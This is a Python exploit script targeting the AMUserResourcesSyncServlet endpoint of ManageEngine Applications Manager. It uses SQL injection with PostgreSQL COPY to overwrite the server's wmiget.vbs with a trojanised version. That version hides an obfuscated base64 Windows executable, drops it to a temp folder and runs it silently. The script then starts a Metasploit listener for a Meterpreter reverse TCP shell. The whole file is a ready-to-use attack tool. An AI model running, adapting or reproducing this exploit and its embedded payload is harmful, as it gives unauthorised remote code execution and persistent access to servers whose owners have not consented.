import sys, requests, urllib3, base64, subprocess
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def deliver_exploit(target, payload, file):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload_bytes = payload.encode("ascii")
    payload_bytes_base64 = base64.b64encode(payload_bytes)
    payload_base64 = payload_bytes_base64.decode("ascii")
    sqli = f";COPY (SELECT convert_from(decode($${payload_base64}$$,$$base64$$), $$utf-8$$)) TO $$C:\\\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\{file}$$;#"
    sqli_url_encode = urllib.parse.quote(sqli, safe='')
    url = f"{target}/servlet/AMUserResourcesSyncServlet"
    data = f"ForMasRange=1&userId=1{sqli_url_encode}"
    r = requests.post(url, data=data, headers=headers, verify=False)
    if r.status_code != 200:
        print("[!] Something went wrong -- exiting...")
        sys.exit(2)

def main():
    if len(sys.argv) != 4:
        print(f"[!] USAGE: {sys.argv[0]} [TARGET] [LHOST] [LPORT] ")
        print(f"[!] EXAMPLE: {sys.argv[0]} http://target-server.com 192.168.1.1 4444")
        sys.exit(2)
    print("[!] WARNING: You'll need to replace the payload value with one generated using your LHOST AND LPORT, converted to a one-liner")
    print(r'''[!] Convert payload to one-liner:
    1. Convert all concatinated strings to one line -- CTRL+F "_"
    2. Replace new-lines with ":" -- sed ':a;N;$!ba;s/\n\n/\n/g' wmiget.vbs | sed ':a;N;$!ba;s/\n/:/g' > wmiget_one-liner.vbs
    3. Replace tabs with spaces -- CTRL+F "    "''')
    target = sys.argv[1]
    print("[-] Adding VBScript Payload to wmiget.vbs...")
    payload = '''On Error Resume Next:Set objWbemLocator = CreateObject("WbemScripting.SWbemLocator"):if Err.Number Then:  WScript.Echo vbCrLf & "Error # " & " " & Err.Description:End If:On Error GoTo 0  :On Error Resume Next:Select Case WScript.Arguments.Count:  Case 2:    :    strComputer = Wscript.Arguments(0):    strQuery = Wscript.Arguments(1):    Set wbemServices = objWbemLocator.ConnectServer(strComputer,"Root\CIMV2"):  :      :    :  Case 4:    strComputer = Wscript.Arguments(0):    strUsername = Wscript.Arguments(1):    strPassword = Wscript.Arguments(2):    strQuery = Wscript.Arguments(3):    Set wbemServices = objWbemLocator.ConnectServer(strComputer,"Root\CIMV2",strUsername,strPassword):        :       case 6:               strComputer = Wscript.Arguments(0):           strUsername = Wscript.Arguments(1):          strPassword = Wscript.Arguments(2):           strQuery = Wscript.Arguments(4):           namespace = Wscript.Arguments(5):         Set wbemServices = objWbemLocator.ConnectServer(strComputer,namespace,strUsername,strPassword):  Case Else:    strMsg = "Error # in parameters passed":    WScript.Echo strMsg:    WScript.Quit(0):  :End Select::Set wbemServices = objWbemLocator.ConnectServer(strComputer, namespace, strUsername, strPassword):if Err.Number Then:  WScript.Echo vbCrLf & "Error # "  & " " & Err.Description:End If:On Error GoTo 0:On Error Resume Next:Set colItems = wbemServices.ExecQuery(strQuery):if Err.Number Then:  WScript.Echo vbCrLf & "Error # "  & " " & Err.Description:End If:On Error GoTo 0:i=0:For Each objItem in colItems:  if i=0 then:    header = "":    For Each param in objItem.Properties_:      header = header & param.Name & vbTab:    Next:    WScript.Echo header:    i=1:  end if:  serviceData = "":  For Each param in objItem.Properties_:    serviceData = serviceData & param.Value & vbTab:  Next:  WScript.Echo serviceData:Next:Function nyegyRbiTvKNk(priYPMldjG):  shXJlxleoxLlw = "<B64DECODE xmlns:dt="& Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & "dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & priYPMldjG & "</B64DECODE>":  Set qPLaeXeQC = CreateObject("MSXML2.DOMDocument.3.0"):  qPLaeXeQC.LoadXML(shXJlxleoxLlw):  nyegyRbiTvKNk = qPLaeXeQC.selectsinglenode("B64DECODE").nodeTypedValue:  set qPLaeXeQC = nothing:End Function:Function hcnjWoxhZrbts():  OCpISLDHnBEpj = "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":  Dim XWIFVsYX:  Set XWIFVsYX = CreateObject("Scripting.FileSystemObject"):  Dim wXYgwyxsdP:  Dim DMFKbOQOoZbYFt:  Set wXYgwyxsdP = XWIFVsYX.GetSpecialFolder(2):  DMFKbOQOoZbYFt = wXYgwyxsdP & "\" & XWIFVsYX.GetTempName():  XWIFVsYX.CreateFolder(DMFKbOQOoZbYFt):  OySvQpGCAja = DMFKbOQOoZbYFt & "\" & "svTnPIlRYWNujEw.exe":  Dim mfNbfwgx:  Set mfNbfwgx = CreateObject("Wscript.Shell"):  yUHhsnwJpijoW = nyegyRbiTvKNk(OCpISLDHnBEpj):  Set DVFnSLrR = CreateObject("ADODB.Stream"):  DVFnSLrR.Type = 1:  DVFnSLrR.Open:  DVFnSLrR.Write yUHhsnwJpijoW:  DVFnSLrR.SaveToFile OySvQpGCAja, 2:  mfNbfwgx.run OySvQpGCAja, 0, true:  XWIFVsYX.DeleteFile(OySvQpGCAja):  XWIFVsYX.DeleteFolder(DMFKbOQOoZbYFt):End Function:hcnjWoxhZrbts:WScript.Quit(0)'''
    deliver_exploit(target, payload, "wmiget.vbs")
    lhost = sys.argv[2]
    lport = sys.argv[3]
    print("[+] Payload delivered!  Starting listener...")
    print("[!] This could take a while depending on the Manage Engine WMI query settings.  Be patient...")
    print("[!] If you have admin privileges to the server, add a monitor that uses WMI to query every 1 minute.")
    subprocess.run([f'''msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST {lhost};set LPORT {lport};run;"'''], shell=True)

if __name__ == '__main__':
    main()